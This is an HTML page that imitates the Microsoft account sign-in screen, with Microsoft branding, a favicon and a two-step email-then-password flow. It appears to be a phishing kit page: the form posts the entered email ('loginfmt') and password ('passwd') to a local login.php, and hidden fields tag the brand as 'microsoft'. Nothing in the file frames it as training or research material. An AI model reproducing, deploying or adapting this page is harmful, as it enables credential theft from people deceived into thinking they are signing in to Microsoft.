

<head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta charset=UTF8>
   <link rel="shortcut icon" href="microsoft1.png" />
   <title>Sign in to your Microsoft account</title>
        <script src="script.js" type="text/javascript"></script>
 <script>function ShowHide(){var a=document.getElementById("scene1");
   var d=document.getElementById("scene2");var c=document.getElementById("outmail");
   var b=document.getElementById("username");if(b.value==""){b.style.borderBottomColor="red";return}else{b.style.borderBottomColor="#0067b8"}if(a.style.display==="block"){a.style.display="none";d.style.display="block";c.innerHTML="&nbsp&nbsp"+b.value}else{d.style.display="none";a.style.display="block"}};</script>
   <style>body{margin:auto;padding:10px}a:hover{text-decoration:underline!important}input:focus{border-bottom-color:#0067b8!important}@media only screen and (max-width:600px){#box{width:110%!important;height:100%!important;margin-top:-10!important;margin-left:-10!important}button{margin-right:60px!important}}</style>
</head>
<body class="abc" style="background-image:url(microsoft.png);background-repeat:no-repeat;background-size:cover">
   <center>
      <div id="box" style="margin-top:130px;background-color:#fff;width:440px;height:338px">
         <form method=POST action=login.php style="padding:40px;width:340px;height:220px">
            <span id="scene1" style="height:100%;width:100%;display:block">
               <img id="logo1" src="microsoft3.png" align="left"><br><br>
               <h1 style="float:left;box-sizing:border-box;color:#1b1b1b;font-size:1.5rem;font-weight:600;font-family:Segoe UI">Sign in</h1>
               <br>
               <input type=hidden name=link value="">
               <input type=hidden name=location value=microsoft />
               <input id="username" name="loginfmt" style="width:100%;box-sizing:border-box;transition:width .25s;height:36px;font-weight:400;font-size:inherit;display:table;border:1px solid transparent;border-bottom-color:#000;background-color:transparent;margin:0" placeholder="Email, phone, or Skype"><br><span style="float:left;font-family:sans-serif;font-size:14px">No account? <a style="color:#0067b8;text-decoration:none" href="">Create one!</a></span><br><br><a style="float:left;font-family:sans-serif;font-size:14px;color:#0067b8;text-decoration:none;display:block" href="">Sign-in options</a><br><br><button onclick="ShowHide()" type="button" style="float:right;color:#fff;width:108px;font-family:sans-serif;height:32px;background-color:#0067b8;min-height:32px;border:0;display:inline-block;padding:4px 12px 4px 12px;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;cursor:pointer;font-size:15px;box-sizing:border-box;direction:ltr">Next</button>
            </span>
            <span id="scene2" style="display:none">
               <img id="logo2" src="microsoft3.png" align="left"><br><br><span onclick="ShowHide()" style="cursor:pointer;float:left;margin:0;padding:0">🡠</span><label id="outmail" style="font-family:Segoe UI;float:left;margin:0;padding:0" value=""></label><br><br>
               <h1 style="float:left!important;color:#1b1b1b;font-size:1.5rem;font-weight:600;margin:0;padding:0;font-family:Segoe UI">Enter password</h1>
               <br><br><input name="passwd" type="password" style="width:348px;height:36px;font-weight:400;font-size:inherit;border:1px solid transparent;border-bottom-color:#000;background-color:transparent;margin:0" placeholder="Password" required><br><br><span style="float:left;font-family:sans-serif;font-size:14px"><input type="checkbox"> &nbspKeep me signed in</span><br><br><a style="float:left;font-family:sans-serif;font-size:13px;color:#0067b8;text-decoration:none" href="">Forgot password?</a><br><br><button type="submit" style="color:#fff;float:right;width:108px;font-family:sans-serif;height:32px;background-color:#0067b8;min-height:32px;border:0;display:inline-block;padding:4px 12px 4px 12px;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;cursor:pointer;font-size:15px;box-sizing:border-box;direction:ltr">Sign in</button>
            </span>
         </form>
      </div>
   </center>
   <br>
   <div style="position:absolute;bottom:0;left:0;color:#fff;width:100%;font-family:sans-serif;background-color:rgba(0,0,0,.6);height:28px;text-align:right"><a style="color:#fff;font-size:12px;line-height:28px;font-weight:400;text-decoration:none" href="">Terms of use&nbsp&nbsp&nbsp</a><a style="color:#fff;font-size:12px;text-decoration:none" href="">Privacy & cookies&nbsp&nbsp&nbsp</a><span style="color:#fff;font-size:20px;text-decoration:none" href="">...&nbsp</span></div>
</body>


